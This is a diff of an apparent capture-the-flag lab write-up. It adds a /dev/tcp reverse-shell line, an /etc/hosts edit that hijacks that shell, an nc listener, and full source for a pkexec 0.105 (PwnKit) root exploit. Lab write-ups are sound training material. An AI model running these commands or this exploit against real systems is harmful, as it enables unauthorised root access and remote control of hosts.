@@ -180,14 +180,14 @@ Seems like I found the password for an ssh login.
 
 
 ```sh
-ssh blue@$IP          
-The authenticity of host '10.10.147.35 (10.10.147.35)' can't be established.
+ssh blue@$IP -T      
+The authenticity of host '$IP ($IP)' can't be established.
 ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
 This host key is known by the following other names/addresses:
     ~/.ssh/known_hosts:15: [hashed name]
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.147.35' (ED25519) to the list of known hosts.
-blue@10.10.147.35's password: 
+Warning: Permanently added '$IP' (ED25519) to the list of known hosts.
+blue@$IP's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -217,7 +217,7 @@ To check for new updates run: sudo apt update
 6 updates could not be installed automatically. For more details,
 see /var/log/unattended-upgrades/unattended-upgrades.log
 
-Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
+Last login: Mon Apr 24 22:18:08 2023 from $IP
 blue@red:~$ 
 ```
 
@@ -252,6 +252,145 @@ Well that's anoying. Also worth noting is that there are automated messages in c
 blue@red:~$ Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run linpeas? Yawn
 blue@red:~$ I really didn't think you would make it this far
 ```
+
+Anyway after doing some enumeration we find an interesting process with `ps -aux`:
+```sh
+red         1701  0.0  0.1   6972  2472 ?        S    18:48   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
+```
+
+If I can change the `redrules.thm` host entry I can redirect the reverse shell to my machine. <br/>
+To do this I use the following command to overwrite the `/etc/hosts` file:
+```sh
+echo "10.18.20.25 redrules.thm" >> /etc/hosts
+```
+
+If we now take a look at the `/etc/hosts` file we see that it worked:
+```sh
+cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 red
+192.168.0.1 redrules.thm
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+10.18.20.25 redrules.thm
+```
+
+After a few seconds I am able to get the reverse shell:
+```sh
+nc -lnvp 9001 
+listening on [any] 9001 ...
+connect to [$IP] from (UNKNOWN) [&IP] 54044
+bash: cannot set terminal process group (1395): Inappropriate ioctl for device
+bash: no job control in this shell
+red@red:~$ ls
+ls
+flag2
+red@red:~$ cat * 
+cat *
+THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
+```
+
+Enumerating the user red:
+```sh
+red@red:~$ ls -la
+ls -la
+total 36
+drwxr-xr-x 4 root red  4096 Aug 17  2022 .
+drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
+lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
+drwx------ 2 red  red  4096 Aug 14  2022 .cache
+-rw-r----- 1 root red    41 Aug 14  2022 flag2
+drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
+-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
+-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
+-rw------- 1 red  red     0 Aug 17  2022 .viminfo
+red@red:~$ ls -la .git/ 
+ls -la .git/
+total 40
+drwxr-x--- 2 red  red   4096 Aug 14  2022 .
+drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
+-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
+```
+
+That may be interesting.
+```sh
+red@red:~$ /home/red/.git/pkexec --version
+/home/red/.git/pkexec --version
+pkexec version 0.105
+```
+
+I did find an exploit for this version. Here's the link: https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html.
+
+Makefile:
+```make
+all:
+  gcc -shared -o evil.so -fPIC evil-so.c
+  gcc exploit.c -o exploit
+
+clean:
+  rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
+```
+
+evil-so.c:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+exploit.c:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
+
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
+```
+
+
+
+
+
 
 
 
